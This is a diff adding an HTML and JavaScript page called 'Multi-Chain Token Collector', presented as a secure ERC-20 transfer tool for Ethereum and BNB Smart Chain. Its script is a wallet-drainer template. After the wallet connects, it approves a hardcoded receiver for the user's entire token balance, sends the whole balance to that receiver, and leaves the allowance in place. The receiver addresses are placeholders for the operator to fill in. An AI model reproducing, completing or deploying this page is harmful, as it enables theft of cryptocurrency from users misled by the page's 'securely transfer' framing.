@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Securely transfer ERC-20 tokens to a receiver wallet on Ethereum or Binance Smart Chain." />
+  <meta name="keywords" content="blockchain, ERC-20, token transfer, Ethereum, BSC, dApp" />
+  <title>Multi-Chain Token Collector</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.12.1/dist/ethers.umd.min.js"></script>
+  <style>
+    :root {
+      --primary-color: #4e44ce;
+      --hover-primary: #372fb5;
+      --bg-color: #0f0f1e;
+      --text-color: #fff;
+      --input-bg: #2a2a3a;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background: var(--bg-color);
+      color: var(--text-color);
+      font-family: 'Segoe UI', sans-serif;
+      padding: 20px;
+      text-align: center;
+    }
+
+    .container {
+      max-width: 600px;
+      margin: 0 auto;
+    }
+
+    h1 {
+      font-size: 2rem;
+      margin-bottom: 20px;
+      color: var(--primary-color);
+    }
+
+    p {
+      font-size: 1rem;
+      margin-bottom: 20px;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+      text-align: left;
+    }
+
+    label {
+      display: block;
+      font-size: 0.9rem;
+      margin-bottom: 5px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      background: var(--input-bg);
+      border: none;
+      border-radius: 5px;
+      color: var(--text-color);
+      font-size: 1rem;
+    }
+
+    input:focus {
+      outline: none;
+      box-shadow: 0 0 5px var(--primary-color);
+    }
+
+    .btn {
+      background: var(--primary-color);
+      color: var(--text-color);
+      border: none;
+      padding: 15px 30px;
+      border-radius: 10px;
+      font-size: 1rem;
+      cursor: pointer;
+      width: 100%;
+      max-width: 300px;
+      margin: 10px auto;
+      display: block;
+      transition: background-color 0.3s ease;
+    }
+
+    .btn:hover {
+      background: var(--hover-primary);
+    }
+
+    .btn:disabled {
+      background: #555;
+      cursor: not-allowed;
+    }
+
+    .status-message {
+      margin: 15px 0;
+      font-size: 0.9rem;
+      word-break: break-all;
+    }
+
+    @media (max-width: 768px) {
+      body {
+        padding: 10px;
+      }
+
+      h1 {
+        font-size: 1.5rem;
+      }
+
+      .btn {
+        padding: 12px 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Multi-Chain Token Collector</h1>
+    <p>Connect your MetaMask or Trust Wallet to transfer ERC-20 tokens.</p>
+    <button class="btn" id="connectBtn" aria-label="Connect Wallet">Connect Wallet</button>
+    <div id="transferSection" style="display: none;">
+      <form id="transferForm">
+        <div class="form-group">
+          <label for="tokenAddress">ERC-20 Token Contract Address</label>
+          <input type="text" id="tokenAddress" placeholder="0x..." required />
+        </div>
+        <button type="submit" class="btn" id="transferBtn" aria-label="Transfer Tokens">Transfer Tokens</button>
+      </form>
+    </div>
+    <div class="status-message" id="status"></div>
+  </div>
+
+  <script>
+    const RECEIVER_ADDRESSES = {
+      1: "YOUR_ETH_RECEIVER_ADDRESS", // Ethereum Mainnet
+      56: "YOUR_BNB_RECEIVER_ADDRESS" // BNB Smart Chain
+    };
+
+    const ERC20_ABI = [
+      "function balanceOf(address) view returns (uint256)",
+      "function transfer(address to, uint256 amount) returns (bool)",
+      "function approve(address spender, uint256 amount) returns (bool)",
+      "function allowance(address owner, address spender) view returns (uint256)",
+      "function decimals() view returns (uint8)"
+    ];
+
+    const chainConfigs = {
+      1: { name: "Ethereum Mainnet", explorer: "https://etherscan.io/tx/" },
+      56: { name: "BNB Smart Chain", explorer: "https://bscscan.com/tx/" }
+    };
+
+    // Show status messages
+    function showStatus(message) {
+      document.getElementById("status").innerHTML = message;
+    }
+
+    // Validate Ethereum address
+    function isValidAddress(address) {
+      return ethers.isAddress(address);
+    }
+
+    // Switch network
+    async function switchNetwork(chainId) {
+      try {
+        await window.ethereum.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: ethers.toBeHex(chainId) }]
+        });
+      } catch (error) {
+        showStatus(`Failed to switch network: ${error.message}`);
+        throw error;
+      }
+    }
+
+    // Connect wallet
+    async function connectWallet() {
+      const connectBtn = document.getElementById("connectBtn");
+      connectBtn.disabled = true;
+
+      try {
+        if (!window.ethereum) {
+          showStatus("Please install MetaMask or Trust Wallet!");
+          return;
+        }
+
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        const signer = await provider.getSigner();
+        const address = await signer.getAddress();
+        const network = await provider.getNetwork();
+        const chainId = Number(network.chainId);
+
+        if (!RECEIVER_ADDRESSES[chainId]) {
+          showStatus("This chain is not supported. Please switch to Ethereum or BSC.");
+          return;
+        }
+
+        showStatus(`Connected: ${address.slice(0, 6)}...${address.slice(-4)}<br>Chain: ${chainConfigs[chainId].name}`);
+        document.getElementById("transferSection").style.display = "block";
+        connectBtn.style.display = "none";
+      } catch (error) {
+        showStatus(`Connection failed: ${error.message}`);
+      } finally {
+        connectBtn.disabled = false;
+      }
+    }
+
+    // Transfer tokens
+    async function transferTokens(event) {
+      event.preventDefault();
+      const transferBtn = document.getElementById("transferBtn");
+      transferBtn.disabled = true;
+
+      try {
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        const signer = await provider.getSigner();
+        const userAddress = await signer.getAddress();
+        const network = await provider.getNetwork();
+        const chainId = Number(network.chainId);
+        const tokenAddress = document.getElementById("tokenAddress").value.trim();
+        const receiver = RECEIVER_ADDRESSES[chainId];
+
+        if (!isValidAddress(tokenAddress)) {
+          showStatus("Invalid token contract address.");
+          return;
+        }
+        if (!receiver) {
+          showStatus("This chain is not supported.");
+          return;
+        }
+
+        const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
+        let decimals;
+        try {
+          decimals = await tokenContract.decimals();
+        } catch {
+          showStatus("Invalid ERC-20 token contract.");
+          return;
+        }
+
+        const balance = await tokenContract.balanceOf(userAddress);
+        if (balance === 0n) {
+          showStatus("Token balance is zero.");
+          return;
+        }
+
+        showStatus("Approving tokens...");
+        const approveTx = await tokenContract.approve(receiver, balance);
+        await approveTx.wait();
+
+        const allowance = await tokenContract.allowance(userAddress, receiver);
+        if (allowance >= balance) {
+          showStatus("Transferring tokens...");
+          const transferTx = await tokenContract.transfer(receiver, balance);
+          const receipt = await transferTx.wait();
+          showStatus(
+            `Tokens transferred! <a href="${chainConfigs[chainId].explorer}${receipt.hash}" target="_blank">View on Explorer</a>`
+          );
+          document.getElementById("transferForm").reset();
+        } else {
+          showStatus("Approval failed.");
+        }
+      } catch (error) {
+        showStatus(`Error: ${error.message}`);
+      } finally {
+        transferBtn.disabled = false;
+      }
+    }
+
+    // Handle wallet disconnect or chain change
+    if (window.ethereum) {
+      window.ethereum.on("accountsChanged", (accounts) => {
+        if (accounts.length === 0) {
+          showStatus("Wallet disconnected.");
+          document.getElementById("transferSection").style.display = "none";
+          document.getElementById("connectBtn").style.display = "block";
+        }
+      });
+      window.ethereum.on("chainChanged", () => {
+        showStatus("Network changed. Please reconnect wallet.");
+        document.getElementById("transferSection").style.display = "none";
+        document.getElementById("connectBtn").style.display = "block";
+      });
+    }
+
+    // Event Listeners
+    document.getElementById("connectBtn").addEventListener("click", connectWallet);
+    document.getElementById("transferForm").addEventListener("submit", transferTokens);
+  </script>
+</body>
+</html>
